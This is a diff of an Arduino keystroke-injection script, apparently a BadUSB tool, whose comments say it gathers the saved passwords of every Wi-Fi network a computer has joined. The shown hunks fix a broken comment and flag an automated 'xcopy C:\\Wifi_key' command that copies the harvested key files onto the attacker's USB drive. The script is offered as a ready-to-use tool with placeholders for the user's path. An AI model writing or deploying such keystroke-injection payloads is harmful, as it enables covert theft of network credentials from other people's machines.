@@ -15,9 +15,9 @@ void setup(){
   // Code Begins Here
 
   // ---THIS SCRIPT IS CREATED BY NicoAndCode---
-  // ---THIS SCRIPT CREATES A FOLDER WITH INSIDE THE
- FILES CONTAINING THE PASSWORDS OF EVERY WI FI NETWORK TO
- WHICH THE COMPUTER IS CONNECTED---
+  // ---THIS SCRIPT CREATES A FOLDER WITH INSIDE THE FILES CONTAINING THE PASSWORDS OF EVERY WI FI NETWORK TO
+ // WHICH THE COMPUTER IS CONNECTED---
+  
   delay(1500);
 
 REM  ---//**CHANGE THE FILE PATH OF YOUR USB (C:\> , E:\> , F:\> ...**//---
@@ -64,7 +64,7 @@ REM  ---//**CHANGE THE FILE PATH OF YOUR USB (C:\> , E:\> , F:\> ...**//---
   delay(150);
 
   // ---COPY FILE IN YOUR USB---
-  Keyboard.print("xcopy C:\\Wifi_key YOUR USB PATH");
+  Keyboard.print("xcopy C:\\Wifi_key YOUR USB PATH"); //<---- CHANGE  
 
   typeKey(KEY_RETURN);
 
